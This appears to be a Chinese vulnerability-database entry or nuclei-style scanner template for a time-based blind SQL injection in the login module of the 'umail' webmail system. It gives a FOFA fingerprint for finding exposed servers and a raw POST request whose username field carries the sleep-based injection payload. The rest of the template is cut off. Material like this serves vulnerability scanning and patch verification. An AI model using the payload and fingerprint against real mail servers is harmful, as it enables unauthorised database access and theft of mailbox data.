# 深圳市福洽科技有限公司umail系统index存在sql注入

- **系统**：深圳市福洽科技有限公司umail系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body=”/webmail/static/script/cryptojs/rollups/aes.js”`
- **请求**：`GET /webmail/index.php?module=view&action=login HTTP/1.1`
- **关键头**：`id: umail-yjgl-index-sqli`　`name: Umail YJGL Index SQL Injection`　`author: XA`　`severity: high`　`description: Detects SQL injection vulnerability in the Umail email system's index.php login module.`　`tags: umail, sqli`　`fofa-query: /webmail/static/script/cryptojs/rollups/aes.js`

**请求体 / payload**
```
1.获取域名
Host:
2.domain=需要填写邮箱:
POST /webmail/index.php?action=login&module=operate&web=1 HTTP/1.1
Host:
Content-Length: 277
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=0mqip0k7nu5a9dbog305jgd4f5
X-Requested-With: XMLHttpRequest
domain=foryouce.com&enter=true&language=zh_TW&nonce=bd93560caca2246e201ec64d8ec8324c3bd3bb1317239445311Y723H944531&password=g00dPa%24%24w0rD&remuser=1&ssllgoin=1&stime=1723944531&token=e434030c3fa3159f863d6bb093a9d8f8&username=0'XOR(if(now()=sysdate()%2Csleep(3)%2C0))XOR'Z
- raw:
-
Host: {{Hostname}}
-
POST /webmail/index.php?action=login&module=ope…（脚本共 1295 字，完整版见原文）
```
- **预期**：200　|　—